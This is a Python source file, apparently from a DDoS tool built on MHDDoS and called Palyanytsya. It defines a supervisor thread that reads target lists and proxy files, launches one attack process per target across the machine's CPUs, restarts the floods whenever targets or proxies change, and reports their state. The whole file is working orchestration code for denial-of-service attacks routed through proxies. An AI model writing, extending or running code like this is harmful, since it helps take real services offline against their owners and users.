import threading
import time
from dataclasses import dataclass
from multiprocessing import Queue, Process
from queue import Empty
from threading import Thread
from typing import List, Dict

import psutil

from MHDDoS.attack import Attack, AttackState
from MHDDoS.utils.config_files import read_configuration_file_lines
from MHDDoS.utils.proxies import load_proxies
from MHDDoS.utils.targets import Target
from utils.input_args import Arguments
from utils.logs import get_logger_for_current_process
from utils.misc import TimeInterval


@dataclass
class AttackSupervisorState:
    is_fetching_configuration: bool
    is_fetching_proxies: bool
    proxies_count: int
    attack_processes_count: int

    attack_states: List[AttackState]


class AttackSupervisor(Thread):
    """Thread which controls the state of the attack processes in Palyanytsya."""

    _args: Arguments
    _attacks_state_queue: Queue
    _supervisor_state_queue: Queue
    _logging_queue: Queue

    _targets: List[Target] = []
    _proxies_addresses: List[str] = []
    _attack_processes: List[Process] = []
    _attack_states: Dict[int, AttackState] = {}

    _targets_fetch_interval: TimeInterval
    _proxies_fetch_interval: TimeInterval

    _internal_loop_sleep_interval: float = 0.01
    _state_publish_interval: float = 0.1

    _is_fetching_proxies: bool = False
    _is_fetching_targets: bool = False

    def __init__(self,
                 args: Arguments,
                 attacks_state_queue: Queue,
                 supervisor_state_queue: Queue,
                 logging_queue: Queue):
        Thread.__init__(self, daemon=True, name="Supervisor")

        self.logger = get_logger_for_current_process(logging_queue, "SUPERVISOR")
        self._logging_queue = logging_queue

        self._args = args
        self._attacks_state_queue = attacks_state_queue
        self._supervisor_state_queue = supervisor_state_queue

        self._targets_fetch_interval = TimeInterval(args.config_fetch_interval)
        self._proxies_fetch_interval = TimeInterval(args.proxies_fetch_interval)

        stop_event = threading.Event()
        stop_event.clear()
        self._stop_event = stop_event

        self.logger.info("Starting attack supervisor...")

    def run(self) -> None:
        logger = self.logger

        state_publisher_thread = Thread(target=self._state_publisher, daemon=True)
        state_publisher_thread.start()

        while not self._stop_event.is_set():
            targets_changed = self._fetch_targets()
            proxies_changed = self._fetch_proxies()

            if targets_changed or proxies_changed:
                self._restart_attacks()

            self._update_attack_states()

            time.sleep(self._internal_loop_sleep_interval)

        logger.info("Supervisor thread stopping...")

        self._stop_all_attacks(True)
        state_publisher_thread.join()

        logger.info("Supervisor thread stopped.")

    def stop(self):
        self._stop_event.set()

    def _fetch_targets(self) -> bool:
        """
        Fetches targets configuration.

        Returns:
            True if targets have changed, False otherwise.
        """
        if not self._targets_fetch_interval.check_if_has_passed():
            return False

        logger = self.logger

        self._is_fetching_targets = True
        logger.info("Fetching targets...")

        config = self._args.config

        new_targets_strings: List[str] = []
        new_targets_strings.extend(self._args.targets)
        if config:
            new_targets_strings.extend(read_configuration_file_lines(config))

        new_targets: List[Target] = []
        for target_string in new_targets_strings:
            logger.info(f"parsing from '{target_string}'")
            target = Target.parse_from_string(target_string)
            if not target:
                continue
            elif target.is_valid:
                new_targets.append(target)
                logger.info(f"Fetched target: '{target}'")
            else:
                logger.error(f"Target '{target}' is not valid. Will not attack this one.")

        # check if the targets changed
        if self._compare_lists(new_targets_strings, self._targets):
            logger.info("Targets have not changed.")
            self._is_fetching_targets = False
            return False

        self._targets = new_targets
        logger.info(f"Targets updated. Attack processes will be re-initialized for {len(new_targets)} loaded targets.")
        self._is_fetching_targets = False
        return True

    def _fetch_proxies(self) -> bool:
        """
        Fetches proxies configuration.

        Returns:
            True if proxies have changed, False otherwise.
        """
        logger = self.logger

        proxies_file_path = self._args.proxies
        if proxies_file_path is None:
            return False
        if not self._proxies_fetch_interval.check_if_has_passed():
            return False

        self._is_fetching_proxies = True
        logger.info("Fetching proxies...")

        new_proxies = load_proxies(proxies_file_path)
        if new_proxies is None:
            logger.error(f"Could not load any proxies from the given path: '{proxies_file_path}'")
            self._is_fetching_proxies = False
            return False

        # check if the proxies changed (we compare the addresses because Proxy objects do not have __eq__ method defined)
        new_proxies_addresses = [f"{p}" for p in new_proxies]
        if self._compare_lists(new_proxies_addresses, self._proxies_addresses):
            logger.info("Proxies have not changed.")
            self._is_fetching_proxies = False
            return False

        self._proxies_addresses = new_proxies_addresses
        logger.info(f"Proxies updated. Attack processes will be re-initialized for {len(new_proxies_addresses)} loaded proxies.")
        self._is_fetching_proxies = False
        return True

    def _stop_all_attacks(self, blocking: bool = False) -> None:
        # kill all existing attack processes
        processes_to_kill = self._attack_processes.copy()
        for process in processes_to_kill:
            process.kill()

        if blocking:
            for process in processes_to_kill:
                process.join()

    def _restart_attacks(self) -> None:
        logger = self.logger

        # kill all existing attack processes
        self._stop_all_attacks()

        # check if we have targets
        targets_count = len(self._targets)
        if targets_count <= 0:
            logger.error("Attacks will not be started, as there are no valid targets.")
            return

        # TODO: apply CPU usage limit to attack processes?
        cpu_count = psutil.cpu_count()
        cpu_per_target = float(cpu_count) / targets_count

        # launch attack process for every target
        for i, target in enumerate(self._targets):
            attack_process = Attack(
                target=target,
                attack_methods=self._args.attack_methods,
                proxies_file_path=self._args.proxies,
                attack_state_queue=self._attacks_state_queue,
                logging_queue=self._logging_queue,
            )
            attack_process.name = f"ATTACK_{i + 1}"
            self._attack_processes.append(attack_process)
            attack_process.start()

        logger.info(f"Started attacks upon {len(self._targets)} targets.")

    def _update_attack_states(self) -> None:
        if len(self._attack_processes) <= 0:
            return

        # collect all that's available in the attack state queue
        new_states: Dict[int, AttackState] = {}
        for _ in range(100):  # <- limit retries so that we don't run infinitely in that low-chance situation where our attack loops share state faster than the Supervisor updates
            try:
                new_state: AttackState = self._attacks_state_queue.get_nowait()
                new_states[new_state.attack_pid] = new_state  # <- overwrite every new state for the same attack PID; this way we will have only the most recent states left in the Dict after this loop
            except Empty:
                break

        previous_attack_states = self._attack_states.copy()
        previous_attack_states.update(new_states)
        self._attack_states = previous_attack_states

    def _restart_dead_attacks(self):
        # TODO: do this
        raise NotImplemented

    def _state_publisher(self):
        while not self._stop_event.is_set():
            sorted_attack_states = [self._attack_states[k] for k in sorted(self._attack_states.keys())]
            state = AttackSupervisorState(
                is_fetching_proxies=self._is_fetching_proxies,
                is_fetching_configuration=self._is_fetching_targets,
                proxies_count=len(self._proxies_addresses),
                attack_processes_count=len(self._attack_processes),
                attack_states=sorted_attack_states,
            )
            self._supervisor_state_queue.put(state)

            time.sleep(self._state_publish_interval)

    @staticmethod
    def _compare_lists(list_a: List, list_b: List) -> bool:
        """
        Compares in two lists have the same items.
        The lists get sorted in-place before the comparison.

        Args:
            list_a: The 1st list.
            list_b: The 2nd list.

        Returns:
            True if all items in the lists are identical, False otherwise.
        """
        list_a.sort()
        list_b.sort()
        return list_a == list_b
